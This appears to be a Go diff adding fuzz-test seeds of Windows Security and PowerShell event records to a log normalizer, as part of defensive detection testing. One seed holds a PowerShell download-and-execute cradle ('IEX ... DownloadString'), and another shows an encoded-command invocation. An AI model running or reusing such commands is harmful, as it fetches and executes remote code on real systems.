@@ -113,6 +113,12 @@ func FuzzIngestBody(f *testing.F) {
 
 // windowsSeeds are Windows and Sysmon records as Fluent Bit sends them.
 var windowsSeeds = []map[string]any{
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": "4724", "StringInserts": []string{"Administrator", "CORP",
+		"S-1-5-21-1-500", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b"}, "Message": "An attempt was made to reset an account's password."},
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4723, "StringInserts": []string{"bob"}},
+	{"Channel": "Security", "Computer": "WS1.corp.local", "EventID": "4731", "StringInserts": []string{"Backup Operators", "WS1",
+		"S-1-5-21-2-1009", "S-1-5-21-1-1104", "eve", "CORP", "0x1a2b", "-", "Backup Operators", "-"}},
+	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4790, "StringInserts": []string{"LdapGroup"}},
 	{"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625, "TimeCreated": "2026-10-11 10:00:00 +0000",
 		"StringInserts": []string{"", "", "", "", "S-1-0-0", "administrator", "CORP", "0xC000006D", "", "0xC000006A", "3",
 			"NtLmSsp ", "NTLM", "KALI", "", "", "", "", `C:\Windows\System32\svchost.exe`, "203.0.113.9", "51234"},
@@ -136,6 +142,10 @@ var windowsSeeds = []map[string]any{
 	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4104",
 		"StringInserts": []string{"2", "3", "IEX (New-Object Net.WebClient).DownloadString('http://x')", "{5d1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", ""}},
 	WinEventRecord(SystemChannel, "7045", "WS1", now, map[string]string{"ServiceName": "evil", "ImagePath": `C:\evil.exe`}),
+	{"Channel": "Microsoft-Windows-PowerShell/Operational", "Computer": "WS1", "EventID": "4103",
+		"StringInserts": []string{"        Host Application = powershell.exe -nop\r\n        User = CORP\\bob\r\n", "", "CommandInvocation(Get-Process): \"Get-Process\""}},
+	{"Channel": "Windows PowerShell", "Computer": "WS1", "EventID": "400",
+		"StringInserts": []string{"Available", "None", "\tNewEngineState=Available\r\n\tHostApplication=powershell -enc AAA\r\n\tEngineVersion=2.0"}},
 }
 
 func FuzzNormalizeWindows(f *testing.F) {
